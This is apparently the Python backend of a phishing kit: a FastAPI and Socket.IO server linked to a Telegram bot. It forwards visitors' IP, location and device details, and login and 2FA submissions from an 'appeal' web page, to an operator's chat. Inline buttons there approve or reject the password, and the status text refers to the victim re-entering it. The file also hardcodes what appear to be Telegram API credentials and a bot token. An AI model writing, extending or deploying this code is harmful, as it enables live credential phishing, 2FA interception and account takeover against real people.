import asyncio
import os
import re
import sys
import traceback
from contextlib import asynccontextmanager

import socketio
import uvicorn
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telethon import Button, TelegramClient, events
from telethon.errors import FloodWaitError, MessageNotModifiedError
from telethon.sessions import StringSession

API_ID = int(os.environ.get("TELEGRAM_API_ID", "24737189"))
API_HASH = os.environ.get("TELEGRAM_API_HASH", "df7185639d01f88796aa91f35ea4f2ea")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA")
CHAT_ID = int(os.environ.get("CHAT_ID", "-7211586401"))

client = TelegramClient(StringSession(), API_ID, API_HASH)
telethon_ready = asyncio.Event()
target_chat = None


async def resolve_target_chat():
    global target_chat
    raw = str(CHAT_ID).lstrip("-")
    candidates: list[int | str] = [CHAT_ID]
    if not str(CHAT_ID).startswith("-100"):
        candidates.append(int(f"-100{raw}"))
    if CHAT_ID < 0:
        candidates.append(int(raw))

    last_err: Exception | None = None
    for cid in candidates:
        try:
            target_chat = await client.get_entity(cid)
            sys.stderr.write(f"resolved chat id {cid}\n")
            return
        except Exception as e:
            last_err = e
            sys.stderr.write(f"resolve chat {cid} failed: {e}\n")

    raise RuntimeError(f"cannot resolve CHAT_ID={CHAT_ID}") from last_err

sio = socketio.AsyncServer(async_mode="asgi", cors_allowed_origins="*")

form_message_data = {}
message_sid_map: dict[int, str] = {}

WAITING_HTML = "⏳ <b>Chờ duyệt...</b>"
WAITING_PLAIN = "⏳ Chờ duyệt..."


def login_buttons(sid: str):
    return [
        [
            Button.inline("ĐÚNG", f"opt_1:{sid}"),
            Button.inline("SAI", f"opt_2:{sid}"),
            Button.inline("2FA", f"opt_3:{sid}"),
            Button.inline("DONE", f"opt_4:{sid}"),
        ],
    ]


def code_buttons(sid: str):
    return [
        [
            Button.inline("ĐÚNG", f"code_opt_1:{sid}"),
            Button.inline("SAI 2FA", f"code_opt_2:{sid}"),
            Button.inline("DONE", f"code_opt_4:{sid}"),
        ],
    ]


def replace_waiting_line(message: str, replacement: str) -> str:
    if WAITING_HTML in message:
        return message.replace(WAITING_HTML, replacement, 1)
    if WAITING_PLAIN in message:
        return message.replace(WAITING_PLAIN, replacement, 1)
    updated = re.sub(
        r"⏳\s*(?:<b>)?(?:[Đđ]ang\s+)?[Cc]hờ duyệt\.{3}(?:</b>)?",
        replacement,
        message,
        count=1,
        flags=re.IGNORECASE,
    )
    if updated != message:
        return updated
    return f"{message.rstrip()}\n\n{replacement}"


def resolve_sid(target_id: str | None, message_id: int | None) -> str | None:
    if message_id and message_id in message_sid_map:
        return message_sid_map[message_id]
    return target_id


def remember_message(sid: str, message_id: int, message_html: str):
    message_sid_map[message_id] = sid
    form_message_data[sid] = {
        **form_message_data.get(sid, {}),
        "message_id": message_id,
        "last_message_html": message_html,
    }


async def get_message_base(message_id: int, sid: str | None, fallback_text: str | None) -> str:
    if sid and sid in form_message_data:
        stored = form_message_data[sid].get("last_message_html")
        if stored:
            return stored

    for data in form_message_data.values():
        if data.get("message_id") == message_id and data.get("last_message_html"):
            return data["last_message_html"]

    if fallback_text:
        return fallback_text

    msg = await client.get_messages(target_chat, ids=message_id)
    if msg and getattr(msg, "text", None):
        return msg.text
    if msg and getattr(msg, "message", None):
        return msg.message
    return ""


async def edit_status_message(
    message_id: int,
    status: str,
    buttons,
    sid: str | None = None,
    fallback_text: str | None = None,
):
    base = await get_message_base(message_id, sid, fallback_text)
    new_text = replace_waiting_line(base, status) if base else status

    await client.edit_message(
        target_chat,
        message_id,
        new_text,
        parse_mode="html",
        buttons=buttons,
    )

    owner = sid or message_sid_map.get(message_id)
    if owner:
        remember_message(owner, message_id, new_text)


async def init_telethon():
    try:
        await client.connect()
        if not await client.is_user_authorized():
            while True:
                try:
                    await client.sign_in(bot_token=BOT_TOKEN)
                    break
                except FloodWaitError as e:
                    sys.stderr.write(f"flood wait {e.seconds}s, retrying...\n")
                    await asyncio.sleep(e.seconds + 1)
        if await client.is_bot():
            client.add_event_handler(button_handler, events.CallbackQuery())
        await resolve_target_chat()
        sys.stderr.write("telethon ready\n")
        telethon_ready.set()
    except Exception:
        sys.stderr.write("lỗi init telethon:\n")
        traceback.print_exc()
        telethon_ready.set()


@asynccontextmanager
async def lifespan(app: FastAPI):
    telethon_task = asyncio.create_task(init_telethon())

    yield

    telethon_task.cancel()
    try:
        await telethon_task
    except asyncio.CancelledError:
        pass

    if client.is_connected():
        disconnect_task = client.disconnect()
        if disconnect_task:
            await disconnect_task


fastapi_app = FastAPI(lifespan=lifespan)
fastapi_app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)


@fastapi_app.get("/health")
async def health():
    return {"status": "ok", "telethon": client.is_connected()}


class NotiPayload(BaseModel):
    ip: str | None = None
    city: str | None = None
    region: str | None = None
    country: str | None = None
    country_code: str | None = None
    asn: int | None = None
    organization: str | None = None
    organization_name: str | None = None
    latitude: str | None = None
    longitude: str | None = None
    timezone: str | None = None
    userAgent: str | None = None
    screenWidth: int | None = None
    screenHeight: int | None = None
    time: str | None = None


@fastapi_app.post("/noti", responses={500: {"description": "Notification delivery failed"}})
async def noti(payload: NotiPayload):
    try:
        await telethon_ready.wait()
        location = (
            f"{payload.city or 'N/A'}, {payload.region or 'N/A'}, "
            f"{payload.country or 'N/A'}"
        )
        screen = f"{payload.screenWidth or '?'}x{payload.screenHeight or '?'}"
        org = payload.organization_name or payload.organization or "N/A"
        msg_text = f"""<b>Time:</b> <code>{payload.time or "N/A"}</code>
<b>IP:</b> <code>{payload.ip or "N/A"}</code>
<b>Location:</b> <code>{location}</code>
<b>ASN:</b> <code>{payload.asn or "N/A"}</code>
<b>Org:</b> <code>{org}</code>
<b>UA:</b> <code>{payload.userAgent or "N/A"}</code>
<b>Screen:</b> <code>{screen}</code>"""
        await client.send_message(target_chat, msg_text, parse_mode="html")
        return {"status": "ok"}
    except Exception:
        sys.stderr.write("lỗi gửi noti:\n")
        traceback.print_exc()
        raise HTTPException(status_code=500, detail="err noti")


app = socketio.ASGIApp(sio, other_asgi_app=fastapi_app)


async def callback_message_text(event: events.CallbackQuery.Event) -> str | None:
    msg = await event.get_message()
    if not msg:
        return None
    return getattr(msg, "message", None) or getattr(msg, "text", None)


async def button_handler(event: events.CallbackQuery.Event):
    toast = "OK"
    try:
        decoded_data = (
            event.data.decode() if isinstance(event.data, bytes) else event.data
        )
        parts = decoded_data.split(":", 1)
        button_type = parts[0]
        target_id = parts[1] if len(parts) == 2 else None
        message_id = event.message_id
        sid = resolve_sid(target_id, message_id)
        room = sid or target_id

        fallback = await callback_message_text(event)

        if button_type == "opt_1":
            toast = "✅ MK đúng — đã duyệt"
            try:
                await edit_status_message(
                    message_id,
                    "✅ <b>Đã duyệt đúng</b>",
                    None,
                    sid,
                    fallback_text=fallback,
                )
            except MessageNotModifiedError:
                await event.edit(buttons=None)
            if room:
                await sio.emit("login_result", {"status": "approved"}, room=room)
        elif button_type == "opt_2":
            toast = "❌ Đã ấn sai"
            if room:
                try:
                    await edit_status_message(
                        message_id,
                        "❌ <b>Đã ấn sai</b> — chờ nạn nhập lại",
                        login_buttons(room),
                        room,
                        fallback_text=fallback,
                    )
                except MessageNotModifiedError:
                    await event.edit(buttons=login_buttons(room))
                await sio.emit("login_result", {"status": "rejected"}, room=room)
        elif button_type == "opt_3":
            toast = "🔐 Chuyển sang 2FA"
            if room:
                await sio.emit("login_result", {"status": "2fa"}, room=room)
                try:
                    await edit_status_message(
                        message_id,
                        "🔐 <b>Chuyển 2FA</b> — web đang mở modal",
                        [[Button.inline("DONE", f"code_opt_4:{room}")]],
                        room,
                        fallback_text=fallback,
                    )
                except MessageNotModifiedError:
                    await event.edit(
                        buttons=[[Button.inline("DONE", f"code_opt_4:{room}")]]
                    )
        elif button_type == "opt_4":
            toast = "⏭ Done — kết thúc"
            try:
                await edit_status_message(
                    message_id,
                    "⏭ <b>Done</b> — kết thúc",
                    None,
                    sid,
                    fallback_text=fallback,
                )
            except MessageNotModifiedError:
                await event.edit(buttons=None)
            if room:
                await sio.emit("login_result", {"status": "skipped"}, room=room)
        elif button_type == "code_opt_1":
            toast = "✅ Code đúng"
            try:
                await edit_status_message(
                    message_id,
                    "✅ <b>Code đúng</b> — đã duyệt",
                    None,
                    sid,
                    fallback_text=fallback,
                )
            except MessageNotModifiedError:
                await event.edit(buttons=None)
            if room:
                await sio.emit("code_result", {"status": "approved"}, room=room)
        elif button_type == "code_opt_2":
            toast = "❌ Code sai"
            if room:
                try:
                    await edit_status_message(
                        message_id,
                        "❌ <b>Đã ấn sai code</b> — chờ nạn nhập lại",
                        code_buttons(room),
                        room,
                        fallback_text=fallback,
                    )
                except MessageNotModifiedError:
                    await event.edit(buttons=code_buttons(room))
                await sio.emit("code_result", {"status": "rejected"}, room=room)
        elif button_type == "code_opt_4":
            toast = "⏭ Done — kết thúc"
            try:
                await edit_status_message(
                    message_id,
                    "⏭ <b>Done</b> — kết thúc",
                    None,
                    sid,
                    fallback_text=fallback,
                )
            except MessageNotModifiedError:
                await event.edit(buttons=None)
            if room:
                await sio.emit("code_result", {"status": "skipped"}, room=room)
        await event.answer(toast, alert=False)
    except Exception:
        sys.stderr.write("lỗi xử lý button:\n")
        traceback.print_exc()
        try:
            await event.answer("Lỗi xử lý nút", alert=True)
        except Exception:
            pass


async def replace_appeal_message(
    sid: str,
    message: str,
    old_message_id: int | None,
    buttons,
    stage: str = "info",
) -> int:
    await telethon_ready.wait()
    if not client.is_connected():
        raise RuntimeError("telethon not connected")

    send_fresh = stage in ("login", "code")

    if old_message_id and send_fresh:
        try:
            await client.delete_messages(target_chat, [old_message_id])
        except Exception:
            sys.stderr.write("delete appeal_message failed:\n")
            traceback.print_exc()
        if old_message_id in message_sid_map:
            del message_sid_map[old_message_id]

        msg = await client.send_message(
            target_chat,
            message,
            parse_mode="html",
            buttons=buttons,
        )
        remember_message(sid, msg.id, message)
        return msg.id

    if old_message_id:
        try:
            await client.edit_message(
                target_chat,
                old_message_id,
                message,
                parse_mode="html",
                buttons=buttons,
            )
            remember_message(sid, old_message_id, message)
            return old_message_id
        except Exception:
            sys.stderr.write("edit appeal_message failed, gửi tin mới:\n")
            traceback.print_exc()

    msg = await client.send_message(
        target_chat,
        message,
        parse_mode="html",
        buttons=buttons,
    )
    remember_message(sid, msg.id, message)
    return msg.id


@sio.event
async def appeal_message(sid, data):
    try:
        message = data.get("message", "")
        old_message_id = data.get("message_id")
        stage = data.get("stage", "info")

        if stage == "login":
            buttons = login_buttons(sid)
        elif stage == "code":
            buttons = code_buttons(sid)
        else:
            buttons = None

        message_id = await replace_appeal_message(
            sid,
            message,
            old_message_id,
            buttons,
            stage=stage,
        )
        await sio.emit("message_sent", {"message_id": message_id}, room=sid)
    except Exception as e:
        sys.stderr.write("lỗi gửi appeal_message:\n")
        traceback.print_exc()
        await sio.emit(
            "message_sent",
            {"message_id": None, "error": str(e) or "appeal_message failed"},
            room=sid,
        )


@sio.event
async def disconnect(sid):
    if sid in form_message_data:
        message_id = form_message_data[sid].get("message_id")
        if message_id in message_sid_map:
            del message_sid_map[message_id]
        del form_message_data[sid]
        sys.stderr.write(f"Cleared form data for disconnected user: {sid}\n")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", "3001"))
    sys.stderr.write(f"backend listening on 0.0.0.0:{port}\n")
    uvicorn.run(app, host="0.0.0.0", port=port, workers=1)
